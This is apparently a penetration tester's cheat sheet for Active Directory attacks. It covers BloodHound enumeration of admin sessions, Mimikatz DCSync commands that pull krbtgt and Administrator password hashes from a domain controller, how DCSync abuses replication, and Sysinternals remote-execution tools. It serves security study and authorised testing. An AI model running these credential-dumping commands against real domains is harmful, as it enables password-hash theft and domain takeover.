# PowerUpSQL

- Dumping Active Directory Domain Info – with PowerUpSQL!: https://blog.netspi.com/dumping-active-directory-domain-info-with-powerupsql/

# Bloodhound

BloodHound uses graph theory to reveal the hidden and often unintended relationships within an Active Directory environment. Attackers can use BloodHound to easily identify highly complex attack paths that would otherwise be impossible to quickly identify.

- GitHub: https://github.com/BloodHoundAD/BloodHound

Find where domain admins are logged in:
```
python http://bloodhound.py  -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME> -dc <DOMAIN_CONTROLLER_HOSTNAME>
neo4j start
bloodhound
```

# Mimkatz

- Mimikatz 2.0 - Golden Ticket Walkthrough: https://www.beneaththewaves.net/Projects/Mimikatz_20_-_Golden_Ticket_Walkthrough.html

## DCSync
> https://adsecurity.org/?p=1729

```
mimikatz “lsadump::dcsync /domain:rd.adsecurity.org /user:krbtgt”
mimikatz “lsadump::dcsync /domain:rd.adsecurity.org /user:Administrator”
```

“impersonates” a Domain Controller and requests account password data from the targeted Domain Controller.

Required Permissions: Any member of `Administrators`, `Domain Admins`, or `Enterprise Admins` as well as `Domain Controller` computer accounts. Read-Only Domain Controllers are not allowed to pull password data for users by default.

* Prior to DCSync was to run Mimikatz or Invoke-Mimikatz on a Domain Controller to get the `KRBTGT password hash` to create `Golden Tickets`
* With DCSync, the attacker can pull the password hash, as well as previous password hashes, from a Domain Controller over the network without requiring interactive logon or copying off the Active Directory database file (ntds.dit).

Internals:
* Discovers Domain Controller in the specified domain name.
* Requests the Domain Controller replicate the user credentials via [GetNCChanges](https://wiki.samba.org/index.php/DRSUAPI) (leveraging Directory Replication Service (DRS) Remote Protocol)

```
“The client DC sends a DSGetNCChanges request to the server when the first one wants to get AD objects updates from the second one. The response contains a set of updates that the client has to apply to its NC replica.

It is possible that the set of updates is too large for only one response message. In those cases, multiple DSGetNCChanges requests and responses are done. This process is called replication cycle or simply cycle.”

“When a DC receives a DSReplicaSync Request, then for each DC that it replicates from (stored in RepsFrom data structure) it performs a replication cycle where it behaves like a client and makes DSGetNCChanges requests to that DC. So it gets up-to-date AD objects from each of the DC’s which it replicates from.”
```

# Sys Internals

> https://technet.microsoft.com/en-in/sysinternals/bb545021.aspx

- `PsExec` - Execute processes on remote machine
- `PsFile` - Displays list of files opened remotely.
- `PsGetSid` - Translate SID to display name and vice versa
- `PsKill` - Kill processes on local or remote machine
- `PsInfo` - Displays installation, install date, kernel build, physical memory, processors type and number, etc.
- `PsList` - Displays process, CPU, Memory, thread statistics
- `PsLoggedOn` - Displays local and remote logged users
- `PsLogList` - View Event logs

# localrecon.cmd

Utility to generate a summary of a Windows system

https://github.com/bitsadmin/miscellaneous/blob/master/localrecon.cmd
